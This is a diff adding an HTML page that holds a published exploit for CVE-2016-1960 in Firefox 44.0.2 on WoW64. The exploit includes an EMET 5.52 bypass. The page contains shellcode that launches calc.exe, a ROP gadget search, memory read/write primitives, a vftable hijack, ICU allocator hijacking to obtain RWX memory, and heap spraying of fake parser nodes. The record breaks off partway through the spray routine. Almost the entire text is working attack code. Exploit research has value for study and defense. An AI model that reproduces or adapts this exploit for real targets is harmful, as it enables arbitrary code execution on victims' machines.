@@ -1,0 +1,1224 @@
+<!doctype html>
+<html>
+<head>
+<meta http-equiv="cache-control" content="no-cache" charset="utf-8" />
+<title>CVE-2016-1960</title>
+<script>
+/*
+ * Exploit Title: Mozilla Firefox < 45.0 nsHtml5TreeBuilder Array Indexing Vulnerability (EMET 5.52 bypass)
+ * Author: Hans Jerry Illikainen (exploit), ca0nguyen (vulnerability)
+ * Vendor Homepage: https://mozilla.org
+ * Software Link: https://ftp.mozilla.org/pub/firefox/releases/44.0.2/win32/en-US/
+ * Version: 44.0.2
+ * Tested on: Windows 7 and Windows 10
+ * CVE: CVE-2016-1960
+ *
+ * Exploit for CVE-2016-1960 [1] targeting Firefox 44.0.2 [2] on WoW64
+ * with/without EMET 5.52.
+ *
+ * Tested on:
+ * - 64bit Windows 10 Pro+Home (version 1703)
+ * - 64bit Windows 7 Pro SP1
+ *
+ * Vulnerability disclosed by ca0nguyen [1].
+ * Exploit written by Hans Jerry Illikainen <hji@dyntopia.com>.
+ *
+ * [1] https://bugzilla.mozilla.org/show_bug.cgi?id=1246014
+ * [2] https://ftp.mozilla.org/pub/firefox/releases/44.0.2/win32/en-US/
+ */
+
+"use strict";
+
+/* This is executed after having pivoted the stack.  `esp' points to a
+ * region on the heap, and the original stack pointer is stored in
+ * `edi'.  In order to bypass EMET, the shellcode should make sure to
+ * xchg edi, esp before any protected function is called.
+ *
+ * For convenience, the first two "arguments" to the shellcode is a
+ * module handle for kernel32.dll and the address of GetProcAddress() */
+const shellcode = [
+    "\x8b\x84\x24\x04\x00\x00\x00", /* mov eax, dword [esp + 0x4] */
+    "\x8b\x8c\x24\x08\x00\x00\x00", /* mov ecx, dword [esp + 0x8] */
+    "\x87\xe7",                     /* xchg edi, esp */
+    "\x56",                         /* push esi */
+    "\x57",                         /* push edi */
+    "\x89\xc6",                     /* mov esi, eax */
+    "\x89\xcf",                     /* mov edi, ecx */
+    "\x68\x78\x65\x63\x00",         /* push xec\0 */
+    "\x68\x57\x69\x6e\x45",         /* push WinE */
+    "\x54",                         /* push esp */
+    "\x56",                         /* push esi */
+    "\xff\xd7",                     /* call edi */
+    "\x83\xc4\x08",                 /* add esp, 0x8 */
+
+    "\x6a\x00",                     /* push 0 */
+    "\x68\x2e\x65\x78\x65",         /* push .exe */
+    "\x68\x63\x61\x6c\x63",         /* push calc */
+    "\x89\xe1",                     /* mov ecx, esp */
+    "\x6a\x01",                     /* push 1 */
+    "\x51",                         /* push ecx */
+    "\xff\xd0",                     /* call eax */
+    "\x83\xc4\x0c",                 /* add esp, 0xc */
+
+    "\x5f",                         /* pop edi */
+    "\x5e",                         /* pop esi */
+    "\x87\xe7",                     /* xchg edi, esp */
+    "\xc3",                         /* ret */
+];
+
+function ROPHelper(pe, rwx) {
+    this.pe = pe;
+    this.rwx = rwx;
+    this.cache = {};
+
+    this.search = function(instructions) {
+        for (let addr in this.cache) {
+            if (this.match(this.cache[addr], instructions) === true) {
+                return addr;
+            }
+        }
+
+        const text = this.pe.text;
+        for (let addr = text.base; addr < text.base + text.size; addr++) {
+            const read = this.rwx.readBytes(addr, instructions.length);
+            if (this.match(instructions, read) === true) {
+                this.cache[addr] = instructions;
+                return addr;
+            }
+        }
+
+        throw new Error("could not find gadgets for " + instructions);
+    };
+
+    this.match = function(a, b) {
+        if (a.length !== b.length) {
+            return false;
+        }
+
+        for (let i = 0; i < a.length; i++) {
+            if (a[i] !== b[i]) {
+                return false;
+            }
+        }
+        return true;
+    };
+
+    this.execute = function(func, args, cleanup) {
+        const u32array = this.rwx.u32array;
+        const ret = this.rwx.calloc(4);
+        let i = this.rwx.div.mem.idx + 2941; /* gadgets after [A] and [B] */
+
+        /*
+         * [A] stack pivot
+         *
+         * xchg eax, esp
+         * ret 0x2de8
+         */
+        const pivot = this.search([0x94, 0xc2, 0xe8, 0x2d]);
+
+        /*
+         * [B] preserve old esp in a nonvolatile register
+         *
+         * xchg eax, edi
+         * ret
+         */
+        const after = this.search([0x97, 0xc3]);
+
+        /*
+         * [C] address to execute
+         */
+        u32array[i++] = func;
+
+        if (cleanup === true && args.length > 0) {
+            if (args.length > 1) {
+                /*
+                 * [E] return address from [C]: cleanup args on the stack
+                 *
+                 * add esp, args.length*4
+                 * ret
+                 */
+                u32array[i++] = this.search([0x83, 0xc4, args.length*4, 0xc3]);
+            } else {
+                /*
+                 * [E] return address from [C]: cleanup arg
+                 *
+                 * pop ecx
+                 * ret
+                 */
+                u32array[i++] = this.search([0x59, 0xc3]);
+            }
+        } else {
+            /*
+             * [E] return address from [C]
+             *
+             * ret
+             */
+            u32array[i++] = this.search([0xc3]);
+        }
+
+        /*
+         * [D] arguments for [C]
+         */
+        for (let j = 0; j < args.length; j++) {
+            u32array[i++] = args[j];
+        }
+
+        /*
+         * [F] pop the location for the return value
+         *
+         * pop ecx
+         * ret
+         */
+        u32array[i++] = this.search([0x59, 0xc3]);
+
+        /*
+         * [G] address to store the return value
+         */
+        u32array[i++] = ret.addr;
+
+        /*
+         * [H] move the return value to [G]
+         *
+         * mov dword [ecx], eax
+         * ret
+         */
+        u32array[i++] = this.search([0x89, 0x01, 0xc3]);
+
+        /*
+         * [I] restore the original esp and return
+         *
+         * mov esp, edi
+         * ret
+         */
+        u32array[i++] = this.search([0x89, 0xfc, 0xc3]);
+
+        this.rwx.execute(pivot, after);
+
+        return u32array[ret.idx];
+    };
+}
+
+function ICUUC55(rop, pe, rwx) {
+    this.rop = rop;
+    this.pe = pe;
+    this.rwx = rwx;
+    this.kernel32 = new KERNEL32(rop, pe, rwx);
+    this.icuuc55handle = this.kernel32.GetModuleHandleA("icuuc55.dll");
+
+    /*
+     * The invocation of uprv_malloc_55() requires special care since
+     * pAlloc points to a protected function (VirtualAlloc).
+     *
+     * ROPHelper.execute() can't be used because:
+     * 1. it pivots the stack to the heap (StackPivot protection)
+     * 2. it returns into the specified function (Caller protection)
+     * 3. the forward ROP chain is based on returns (SimExecFlow protection)
+     *
+     * This function consist of several steps:
+     * 1. a second-stage ROP chain is written to the stack
+     * 2. a first-stage ROP chain is executed that pivots to the heap
+     * 3. the first-stage ROP chain continues by pivoting to #1
+     * 4. uprv_malloc_55() is invoked
+     * 5. the return value is saved
+     * 6. the original stack is restored
+     *
+     * Of note is that uprv_malloc_55() only takes a `size' argument,
+     * and it passes two arguments to the hijacked pAlloc function
+     * pointer (context and size; both in our control).  VirtualAlloc,
+     * on the other hand, expects four arguments.  So, we'll have to
+     * setup the stack so that the values interpreted by VirtualAlloc as
+     * its arguments are reasonably-looking.
+     *
+     * By the time that uprv_malloc_55() is returned into, the stack
+     * will look like:
+     * [A] [B] [C] [D]
+     *
+     * When pAlloc is entered, the stack will look like:
+     * [uprv_malloc_55()-ret] [pContext] [B] [A] [B] [C] [D]
+     *
+     * Since we've set pAlloc to point at VirtualAlloc, the call is
+     * interpreted as VirtualAlloc(pContext, B, A, B);
+     *
+     * Hence, because we want `flProtect' to be PAGE_EXECUTE_READWRITE,
+     * we also have to have a `size' with the same value; meaning our
+     * rwx allocation will only be 0x40 bytes.
+     *
+     * This is not a problem, since we can simply write a small snippet
+     * of shellcode that allocates a larger region in a non-ROPy way
+     * afterwards.
+     */
+    this.uprv_malloc_55 = function(stackAddr) {
+        const func = this.kernel32.GetProcAddress(this.icuuc55handle,
+                                                  "uprv_malloc_55");
+        const ret = this.rwx.calloc(4);
+        const u32array = this.rwx.u32array;
+
+        /**********************
+         * second stage gadgets
+         **********************/
+        const stackGadgets = new Array(
+            func,
+
+            0x1000,     /* [A] flAllocationType (MEM_COMMIT) */
+            0x40,       /* [B] dwSize and flProtect (PAGE_EXECUTE_READWRITE) */
+            0x41414141, /* [C] */
+            0x42424242, /* [D] */
+
+            /*
+             * location to write the return value
+             *
+             * pop ecx
+             * ret
+             */
+            this.rop.search([0x59, 0xc3]),
+            ret.addr,
+
+            /*
+             * do the write
+             *
+             * mov dword [ecx], eax
+             * ret
+             */
+            this.rop.search([0x89, 0x01, 0xc3]),
+
+            /*
+             * restore the old stack
+             *
+             * mov esp, edi
+             * ret
+             */
+            this.rop.search([0x89, 0xfc, 0xc3])
+        );
+
+        const origStack = this.rwx.readDWords(stackAddr, stackGadgets.length);
+        this.rwx.writeDWords(stackAddr, stackGadgets);
+
+
+        /*********************
+         * first stage gadgets
+         *********************/
+        /*
+         * pivot
+         *
+         * xchg eax, esp
+         * ret 0x2de8
+         */
+        const pivot = this.rop.search([0x94, 0xc2, 0xe8, 0x2d]);
+
+        /*
+         * preserve old esp in a nonvolatile register
+         *
+         * xchg eax, edi
+         * ret
+         */
+        const after = this.rop.search([0x97, 0xc3]);
+
+        /*
+         * pivot to the second stage
+         *
+         * pop esp
+         * ret
+         */
+        u32array[this.rwx.div.mem.idx + 2941] = this.rop.search([0x5c, 0xc3]);
+        u32array[this.rwx.div.mem.idx + 2942] = stackAddr;
+
+        /*
+         * here we go :)
+         */
+        this.rwx.execute(pivot, after);
+        this.rwx.writeDWords(stackAddr, origStack);
+
+        if (u32array[ret.idx] === 0) {
+            throw new Error("uprv_malloc_55() failed");
+        }
+        return u32array[ret.idx];
+    };
+
+    /*
+     * Overrides the pointers in firefox-44.0.2/intl/icu/source/common/cmemory.c
+     */
+    this.u_setMemoryFunctions_55 = function(context, a, r, f, status) {
+        const func = this.kernel32.GetProcAddress(this.icuuc55handle,
+                                                  "u_setMemoryFunctions_55");
+        this.rop.execute(func, [context, a, r, f, status], true);
+    };
+
+    /*
+     * Sets `pAlloc' to VirtualAlloc.  `pRealloc' and `pFree' are
+     * set to point to small gadgets.
+     */
+    this.set = function() {
+        const status = this.rwx.calloc(4);
+        const alloc = this.pe.search("kernel32.dll", "VirtualAlloc");
+
+        /* pretend to be a failed reallocation
+         *
+         * xor eax, eax
+         * ret */
+        const realloc = this.rop.search([0x33, 0xc0, 0xc3]);
+
+        /* let the chunk live
+         *
+         * ret */
+        const free = this.rop.search([0xc3]);
+
+        this.u_setMemoryFunctions_55(0, alloc, realloc, free, status.addr);
+        if (this.rwx.u32array[status.idx] !== 0) {
+            throw new Error("u_setMemoryFunctions_55() failed");
+        }
+    };
+
+    /*
+     * This (sort of) restores the functionality in
+     * intl/icu/source/common/cmemory.c by reusing the previously
+     * allocated PAGE_EXECUTE_READWRITE chunk to set up three stubs that
+     * invokes an appropriate function in mozglue.dll
+     */
+    this.reset = function(chunk) {
+        const u32array = this.rwx.u32array;
+        const status = this.rwx.calloc(4);
+
+        /*
+         * pFree
+         */
+        const free = {};
+        free.addr = chunk;
+        free.func = this.rwx.calloc(4);
+        free.func.str = this.dword2str(free.func.addr);
+        free.code = [
+            "\x8b\x84\x24\x08\x00\x00\x00", /* mov eax, dword [esp + 0x8] */
+            "\x50",                         /* push eax */
+            "\x8b\x05" + free.func.str,     /* mov eax, [location-of-free] */
+            "\xff\xd0",                     /* call eax */
+            "\x59",                         /* pop ecx */
+            "\xc3",                         /* ret */
+        ].join("");
+        u32array[free.func.idx] = this.pe.search("mozglue.dll", "free");
+        this.rwx.writeString(free.addr, free.code);
+
+        /*
+         * pAlloc
+         */
+        const alloc = {};
+        alloc.addr = chunk + free.code.length;
+        alloc.func = this.rwx.calloc(4);
+        alloc.func.str = this.dword2str(alloc.func.addr);
+        alloc.code = [
+            "\x8b\x84\x24\x08\x00\x00\x00", /* mov eax, dword [esp + 0x8] */
+            "\x50",                         /* push eax */
+            "\x8b\x05" + alloc.func.str,    /* mov eax, [location-of-alloc] */
+            "\xff\xd0",                     /* call eax */
+            "\x59",                         /* pop ecx */
+            "\xc3",                         /* ret */
+        ].join("");
+        u32array[alloc.func.idx] = this.pe.search("mozglue.dll", "malloc");
+        this.rwx.writeString(alloc.addr, alloc.code);
+
+        /*
+         * pRealloc
+         */
+        const realloc = {};
+        realloc.addr = chunk + free.code.length + alloc.code.length;
+        realloc.func = this.rwx.calloc(4);
+        realloc.func.str = this.dword2str(realloc.func.addr);
+        realloc.code = [
+            "\x8b\x84\x24\x0c\x00\x00\x00", /* mov eax, dword [esp + 0xc] */
+            "\x50",                         /* push eax */
+            "\x8b\x84\x24\x0c\x00\x00\x00", /* mov eax, dword [esp + 0xc] */
+            "\x50",                         /* push eax */
+            "\x8b\x05" + realloc.func.str,  /* mov eax, [location-of-realloc] */
+            "\xff\xd0",                     /* call eax */
+            "\x59",                         /* pop ecx */
+            "\x59",                         /* pop ecx */
+            "\xc3",                         /* ret */
+        ].join("");
+        u32array[realloc.func.idx] = this.pe.search("mozglue.dll", "realloc");
+        this.rwx.writeString(realloc.addr, realloc.code);
+
+        this.u_setMemoryFunctions_55(0,
+                                     alloc.addr,
+                                     realloc.addr,
+                                     free.addr,
+                                     status.addr);
+        if (u32array[status.idx] !== 0) {
+            throw new Error("u_setMemoryFunctions_55() failed");
+        }
+    };
+
+    /*
+     * Allocates a small chunk of memory marked RWX, which is used
+     * to allocate a `size'-byte chunk (see uprv_malloc_55()).  The
+     * first allocation is then repurposed in reset().
+     */
+    this.alloc = function(stackAddr, size) {
+        /*
+         * hijack the function pointers
+         */
+        this.set();
+
+        /*
+         * do the initial 0x40 byte allocation
+         */
+        const chunk = this.uprv_malloc_55(stackAddr);
+        log("allocated 0x40 byte chunk at 0x" + chunk.toString(16));
+
+        /*
+         * allocate a larger chunk now that we're no longer limited to ROP/JOP
+         */
+        const u32array = this.rwx.u32array;
+        const func = this.rwx.calloc(4);
+        func.str = this.dword2str(func.addr);
+        u32array[func.idx] = this.pe.search("kernel32.dll", "VirtualAlloc");
+        const code = [
+            "\x87\xe7",                    /* xchg edi, esp (orig stack) */
+            "\x6a\x40",                    /* push 0x40 (flProtect) */
+            "\x68\x00\x10\x00\x00",        /* push 0x1000 (flAllocationType) */
+            "\xb8" + this.dword2str(size), /* move eax, size */
+            "\x50",                        /* push eax (dwSize) */
+            "\x6a\x00",                    /* push 0 (lpAddress) */
+            "\x8b\x05" + func.str,         /* mov eax, [loc-of-VirtualAlloc] */
+            "\xff\xd0",                    /* call eax */
+            "\x87\xe7",                    /* xchg edi, esp (back to heap) */
+            "\xc3",                        /* ret */
+        ].join("");
+        this.rwx.writeString(chunk, code);
+        const newChunk = this.rop.execute(chunk, [], false);
+        log("allocated " + size + " byte chunk at 0x" + newChunk.toString(16));
+
+        /*
+         * repurpose the first rwx chunk to restore functionality
+         */
+        this.reset(chunk);
+
+        return newChunk;
+    };
+
+    this.dword2str = function(dword) {
+        let str = "";
+        for (let i = 0; i < 4; i++) {
+            str += String.fromCharCode((dword >> 8 * i) & 0xff);
+        }
+        return str;
+    };
+}
+
+function KERNEL32(rop, pe, rwx) {
+    this.rop = rop;
+    this.pe = pe;
+    this.rwx = rwx;
+
+    /*
+     * Retrieves a handle for an imported module
+     */
+    this.GetModuleHandleA = function(lpModuleName) {
+        const func = this.pe.search("kernel32.dll", "GetModuleHandleA");
+        const name = this.rwx.copyString(lpModuleName);
+        const module = this.rop.execute(func, [name.addr], false);
+        if (module === 0) {
+            throw new Error("could not get a handle for " + lpModuleName);
+        }
+        return module;
+    };
+
+    /*
+     * Retrieves the address of an exported symbol.  Do not invoke this
+     * function on protected modules (if you want to bypass EAF); instead
+     * try to locate the symbol in any of the import tables or choose
+     * another target.
+     */
+    this.GetProcAddress = function(hModule, lpProcName) {
+        const func = this.pe.search("kernel32.dll", "GetProcAddress");
+        const name = this.rwx.copyString(lpProcName);
+        const addr = this.rop.execute(func, [hModule, name.addr], false);
+        if (addr === 0) {
+            throw new Error("could not get address for " + lpProcName);
+        }
+        return addr;
+    };
+
+    /*
+     * Retrieves a handle for the current thread
+     */
+    this.GetCurrentThread = function() {
+        const func = this.pe.search("kernel32.dll", "GetCurrentThread");
+        return this.rop.execute(func, [], false);
+    };
+}
+
+function NTDLL(rop, pe, rwx) {
+    this.rop = rop;
+    this.pe = pe;
+    this.rwx = rwx;
+
+    /*
+     * Retrieves the stack limit from the Thread Environment Block
+     */
+    this.getStackLimit = function(ThreadHandle) {
+        const mem = this.rwx.calloc(0x1c);
+        this.NtQueryInformationThread(ThreadHandle, 0, mem.addr, mem.size, 0);
+        return this.rwx.readDWord(this.rwx.u32array[mem.idx+1] + 8);
+    };
+
+    /*
+     * Retrieves thread information
+     */
+    this.NtQueryInformationThread = function(ThreadHandle,
+                                             ThreadInformationClass,
+                                             ThreadInformation,
+                                             ThreadInformationLength,
+                                             ReturnLength) {
+        const func = this.pe.search("ntdll.dll", "NtQueryInformationThread");
+        const ret = this.rop.execute(func, arguments, false);
+        if (ret !== 0) {
+            throw new Error("NtQueryInformationThread failed");
+        }
+        return ret;
+    };
+}
+
+function ReadWriteExecute(u32base, u32array, array) {
+    this.u32base = u32base;
+    this.u32array = u32array;
+    this.array = array;
+
+    /*
+     * Reads `length' bytes from `addr' through a fake string
+     */
+    this.readBytes = function(addr, length) {
+        /* create a string-jsval */
+        this.u32array[4] = this.u32base + 6*4;   /* addr to meta */
+        this.u32array[5] = 0xffffff85;           /* type (JSVAL_TAG_STRING) */
+
+        /* metadata */
+        this.u32array[6] = 0x49;   /* flags */
+        this.u32array[7] = length; /* read size */
+        this.u32array[8] = addr;   /* memory to read */
+
+        /* Uint8Array is *significantly* slower, which kills our ROP hunting */
+        const result = new Array();
+
+        const str = this.getArrayElem(4);
+        for (let i = 0; i < str.length; i++) {
+            result[i] = str.charCodeAt(i);
+        }
+
+        return result;
+    };
+
+    this.readDWords = function(addr, num) {
+        const bytes = this.readBytes(addr, num * 4);
+        const dwords = new Uint32Array(num);
+        for (let i = 0; i < bytes.length; i += 4) {
+            for (let j = 0; j < 4; j++) {
+                dwords[i/4] |= bytes[i+j] << (8 * j);
+            }
+        }
+        return dwords;
+    };
+
+    this.readDWord = function(addr) {
+        return this.readDWords(addr, 1)[0];
+    };
+
+    this.readWords = function(addr, num) {
+        const bytes = this.readBytes(addr, num * 2);
+        const words = new Uint16Array(num);
+        for (let i = 0; i < bytes.length; i += 2) {
+            for (let j = 0; j < 2; j++) {
+                words[i/2] |= bytes[i+j] << (8 * j);
+            }
+        }
+        return words;
+    };
+
+    this.readWord = function(addr) {
+        return this.readWords(addr, 1)[0];
+    };
+
+    this.readString = function(addr) {
+        for (let i = 0, str = ""; ; i++) {
+            const chr = this.readBytes(addr + i, 1)[0];
+            if (chr === 0) {
+                return str;
+            }
+            str += String.fromCharCode(chr);
+        }
+    };
+
+    /*
+     * Writes `values' to `addr' by using the metadata of an Uint8Array
+     * to set up a write primitive
+     */
+    this.writeBytes = function(addr, values) {
+        /* create jsval */
+        const jsMem = this.calloc(8);
+        this.setArrayElem(jsMem.idx, new Uint8Array(values.length));
+
+        /* copy metadata */
+        const meta = this.readDWords(this.u32array[jsMem.idx], 12);
+        const metaMem = this.calloc(meta.length * 4);
+        for (let i = 0; i < meta.length; i++) {
+            this.u32array[metaMem.idx + i] = meta[i];
+        }
+
+        /* change the pointer to the contents of the Uint8Array */
+        this.u32array[metaMem.idx + 10] = addr;
+
+        /* change the pointer to the metadata */
+        const oldMeta = this.u32array[jsMem.idx];
+        this.u32array[jsMem.idx] = metaMem.addr;
+
+        /* write */
+        const u8 = this.getArrayElem(jsMem.idx);
+        for (let i = 0; i < values.length; i++) {
+            u8[i] = values[i];
+        }
+
+        /* clean up */
+        this.u32array[jsMem.idx] = oldMeta;
+    };
+
+    this.writeDWords = function(addr, values) {
+        const u8 = new Uint8Array(values.length * 4);
+        for (let i = 0; i < values.length; i++) {
+            for (let j = 0; j < 4; j++) {
+                u8[i*4 + j] = values[i] >> (8 * j) & 0xff;
+            }
+        }
+        this.writeBytes(addr, u8);
+    };
+
+    this.writeDWord = function(addr, value) {
+        const u32 = new Uint32Array(1);
+        u32[0] = value;
+        this.writeDWords(addr, u32);
+    };
+
+    this.writeString = function(addr, str) {
+        const u8 = new Uint8Array(str.length);
+
+        for (let i = 0; i < str.length; i++) {
+            u8[i] = str.charCodeAt(i);
+        }
+        this.writeBytes(addr, u8);
+    };
+
+    /*
+     * Copies a string to the `u32array' and returns an object from
+     * calloc().
+     *
+     * This is an ugly workaround to allow placing a string at a known
+     * location without having to implement proper support for JSString
+     * and its various string types.
+     */
+    this.copyString = function(str) {
+        str += "\x00".repeat(4 - str.length % 4);
+        const mem = this.calloc(str.length);
+
+        for (let i = 0, j = 0; i < str.length; i++) {
+            if (i && !(i % 4)) {
+                j++;
+            }
+            this.u32array[mem.idx + j] |= str.charCodeAt(i) << (8 * (i % 4));
+        }
+        return mem;
+    };
+
+    /*
+     * Creates a <div> and copies the contents of its vftable to
+     * writable memory.
+     */
+    this.createExecuteDiv = function() {
+        const div = {};
+
+        /* 0x3000 bytes should be enough for the div, vftable and gadgets */
+        div.mem = this.calloc(0x3000);
+
+        div.elem = document.createElement("div");
+        this.setArrayElem(div.mem.idx, div.elem);
+
+        /* addr of the div */
+        const addr = this.u32array[div.mem.idx];
+
+        /* *(addr+4) = this */
+        const ths = this.readDWord(addr + 4*4);
+
+        /* *this = xul!mozilla::dom::HTMLDivElement::`vftable' */
+        const vftable = this.readDWord(ths);
+
+        /* copy the vftable (the size is a guesstimate) */
+        const entries = this.readDWords(vftable, 512);
+        this.writeDWords(div.mem.addr + 4*2, entries);
+
+        /* replace the pointer to the original vftable with ours */
+        this.writeDWord(ths, div.mem.addr + 4*2);
+
+        return div;
+    };
+
+    /*
+     * Replaces two vftable entries of the previously created div and
+     * triggers code execution
+     */
+    this.execute = function(pivot, postPivot) {
+        /* vftable entry for xul!nsGenericHTMLElement::QueryInterface
+         * kind of ugly, but we'll land here after the pivot that's used
+         * in ROPHelper.execute() */
+        const savedQueryInterface = this.u32array[this.div.mem.idx + 2];
+        this.u32array[this.div.mem.idx + 2] = postPivot;
+
+        /* vftable entry for xul!nsGenericHTMLElement::Click */
+        const savedClick = this.u32array[this.div.mem.idx + 131];
+        this.u32array[this.div.mem.idx + 131] = pivot;
+
+        /* execute */
+        this.div.elem.click();
+
+        /* restore our overwritten vftable pointers */
+        this.u32array[this.div.mem.idx + 2] = savedQueryInterface;
+        this.u32array[this.div.mem.idx + 131] = savedClick;
+    };
+
+    /*
+     * Reserves space in the `u32array' and initializes it to 0.
+     *
+     * Returns an object with the following properties:
+     * - idx: index of the start of the allocation in the u32array
+     * - addr: start address of the allocation
+     * - size: non-padded allocation size
+     * - realSize: padded size
+     */
+    this.calloc = function(size) {
+        let padded = size;
+        if (!size || size % 4) {
+            padded += 4 - size % 4;
+        }
+
+        const found = [];
+        /* the first few dwords are reserved for the metadata belonging
+         * to `this.array' and for the JSString in readBytes (since using
+         * this function would impact the speed of the ROP hunting) */
+        for (let i = 10; i < this.u32array.length - 1; i += 2) {
+            if (this.u32array[i] === 0x11223344 &&
+                this.u32array[i+1] === 0x55667788) {
+                found.push(i, i+1);
+                if (found.length >= padded / 4) {
+                    for (let j = 0; j < found.length; j++) {
+                        this.u32array[found[j]] = 0;
+                    }
+                    return {
+                        idx: found[0],
+                        addr: this.u32base + found[0]*4,
+                        size: size,
+                        realSize: padded,
+                    };
+                }
+            } else {
+                found.length = 0;
+            }
+        }
+        throw new Error("calloc(): out of memory");
+    };
+
+    /*
+     * Returns an element in `array' based on an index for `u32array'
+     */
+    this.getArrayElem = function(idx) {
+        if (idx <= 3 || idx % 2) {
+            throw new Error("invalid index");
+        }
+        return this.array[(idx - 4) / 2];
+    };
+
+    /*
+     * Sets an element in `array' based on an index for `u32array'
+     */
+    this.setArrayElem = function(idx, value) {
+        if (idx <= 3 || idx % 2) {
+            throw new Error("invalid index");
+        }
+        this.array[(idx - 4) / 2] = value;
+    };
+
+    this.div = this.createExecuteDiv();
+}
+
+function PortableExecutable(base, rwx) {
+    this.base = base;
+    this.rwx = rwx;
+    this.imports = {};
+    this.text = {};
+
+    /*
+     * Parses the PE import table.  Some resources of interest:
+     *
+     * - An In-Depth Look into the Win32 Portable Executable File Format
+     *   https://msdn.microsoft.com/en-us/magazine/bb985992(printer).aspx
+     *
+     * - Microsoft Portable Executable and Common Object File Format Specification
+     *   https://www.microsoft.com/en-us/download/details.aspx?id=19509
+     *
+     * - Understanding the Import Address Table
+     *   http://sandsprite.com/CodeStuff/Understanding_imports.html
+     */
+    this.read = function() {
+        const rwx = this.rwx;
+        let addr = this.base;
+
+        /*
+         * DOS header
+         */
+        const magic = rwx.readWord(addr);
+        if (magic !== 0x5a4d) {
+            throw new Error("bad DOS header");
+        }
+        const lfanew = rwx.readDWord(addr + 0x3c, 4);
+        addr += lfanew;
+
+        /*
+         * Signature
+         */
+        const signature = rwx.readDWord(addr);
+        if (signature !== 0x00004550) {
+            throw new Error("bad signature");
+        }
+        addr += 4;
+
+        /*
+         * COFF File Header
+         */
+        addr += 20;
+
+        /*
+         * Optional Header
+         */
+        const optionalMagic = rwx.readWord(addr);
+        if (optionalMagic !== 0x010b) {
+            throw new Error("bad optional header");
+        }
+
+        this.text.size = rwx.readDWord(addr + 4);
+        this.text.base = this.base + rwx.readDWord(addr + 20);
+
+        const numberOfRvaAndSizes = rwx.readDWord(addr + 92);
+        addr += 96;
+
+        /*
+         * Optional Header Data Directories
+         *
+         * N entries * 2 DWORDs (RVA and size)
+         */
+        const directories = rwx.readDWords(addr, numberOfRvaAndSizes * 2);
+
+        for (let i = 0; i < directories[3] - 5*4; i += 5*4) {
+            /* Import Directory Table (N entries * 5 DWORDs) */
+            const members = rwx.readDWords(this.base + directories[2] + i, 5);
+            const lookupTable = this.base + members[0];
+            const dllName = rwx.readString(this.base+members[3]).toLowerCase();
+            const addrTable = this.base + members[4];
+
+            this.imports[dllName] = {};
+
+            /* Import Lookup Table */
+            for (let j = 0; ; j += 4) {
+                const hintNameRva = rwx.readDWord(lookupTable + j);
+                /* the last entry is NULL */
+                if (hintNameRva === 0) {
+                    break;
+                }
+
+                /* name is not available if the dll is imported by ordinal */
+                if (hintNameRva & (1 << 31)) {
+                    continue;
+                }
+
+                const importName = rwx.readString(this.base + hintNameRva + 2);
+                const importAddr = rwx.readDWord(addrTable + j);
+                this.imports[dllName][importName] = importAddr;
+            }
+        }
+    };
+
+    /*
+     * Searches for an imported symbol
+     */
+    this.search = function(dll, symbol) {
+        if (this.imports[dll] === undefined) {
+            throw new Error("unknown dll: " + dll);
+        }
+
+        const addr = this.imports[dll][symbol];
+        if (addr === undefined) {
+            throw new Error("unknown symbol: " + symbol);
+        }
+        return addr;
+    };
+}
+
+function Spray() {
+    this.nodeBase = 0x80000000;
+    this.ptrNum = 64;
+    this.refcount = 0xffffffff;
+    /*
+     * 0:005> ?? sizeof(nsHtml5StackNode)
+     * unsigned int 0x1c
+     */
+    this.nsHtml5StackNodeSize = 0x1c;
+
+    /*
+     * Creates a bunch of fake nsHtml5StackNode:s with the hope of hitting
+     * the address of elementName->name when it's [xul!nsHtml5Atoms::style].
+     *
+     * Ultimately, the goal is to enter the conditional on line 2743:
+     *
+     * firefox-44.0.2/parser/html/nsHtml5TreeBuilder.cpp:2743
+     * ,----
+     * | 2214 void
+     * | 2215 nsHtml5TreeBuilder::endTag(nsHtml5ElementName* elementName)
+     * | 2216 {
+     * | ....
+     * | 2221   nsIAtom* name = elementName->name;
+     * | ....
+     * | 2741   for (; ; ) {
+     * | 2742     nsHtml5StackNode* node = stack[eltPos];
+     * | 2743     if (node->ns == kNameSpaceID_XHTML && node->name == name) {
+     * | ....
+     * | 2748       while (currentPtr >= eltPos) {
+     * | 2749         pop();
+     * | 2750       }
+     * | 2751       NS_HTML5_BREAK(endtagloop);
+     * | 2752     } else if (node->isSpecial()) {
+     * | 2753       errStrayEndTag(name);
+     * | 2754       NS_HTML5_BREAK(endtagloop);
+     * | 2755     }
+     * | 2756     eltPos--;
+     * | 2757   }
+     * | ....
+     * | 3035 }
+     * `----
+     *
+     * We get 64 attempts each time the bug is triggered -- however, in
+     * order to have a clean break, the last node has its flags set to
+     * NS_HTML5ELEMENT_NAME_SPECIAL, so that the conditional on line
+     * 2752 is entered.
+     *
+     * If we do find ourselves with a node->name == name, then
+     * nsHtml5TreeBuilder::pop() invokes nsHtml5StackNode::release().
+     * The release() method decrements the nodes refcount -- and, if the
+     * refcount reaches 0, also deletes it.
+     *
+     * Assuming everything goes well, the Uint32Array is allocated with
+     * the method presented by SkyLined/@berendjanwever in:
+     *
+     * "Heap spraying high addresses in 32-bit Chrome/Firefox on 64-bit Windows"
+     * http://blog.skylined.nl/20160622001.html
+     */
+    this.nodes = function(name, bruteforce) {
+        const nodes = new Uint32Array(0x19000000);
+        const size = this.nsHtml5StackNodeSize / 4;
+        const refcount = bruteforce ? this.refcount : 1;
+        let flags = 0;
+
+        for (let i = 0; i < this.ptrNum * size; i += size) {
+            if (i === (this.ptrNum - 1) * size) {
+                flags = 1 << 29; /* NS_HTML5ELEMENT_NAME_SPECIAL */
+                name = 0x0;
+            }
+            nodes[i] = flags;
+            nodes[i+1] = name;
+            nodes[i+2] = 0; /* popName */
+            nodes[i+3] = 3; /* ns (kNameSpaceID_XHTML) */
+            nodes[i+4] = 0; /* node */
+            nodes[i+5] = 0; /* attributes */
+            nodes[i+6] = refcount;
+            name += 0x100000;
+        }
+        return nodes;
+    };
+
+    /*
+     * Sprays pointers to the fake nsHtml5StackNode:s created in nodes()
+     */
+    this.pointers = function() {
+        const pointers = new Array();
+
+        for (let i = 0; i < 0x30000; i++) {
+            pointers[i] = new Uint32Array(this.ptrNum);
+            let node = this.nodeBase;
+            for (let j = pointers[i].length - 1; j >= 0; j--) {
+                pointers[i][j] = node;
+                node += this.nsHtml5StackNodeSize;
+            }
+        }
+        return pointers;
+    };
+
+    /*
+     * Sprays a bunch of arrays with the goal of having one hijack the
+     * previously freed Uint32Array
+     */
+    this.arrays = function() {
+        const array = new Array();
+
+        for (let i = 0; i < 0x800; i++) {
+            array[i] = new Array();
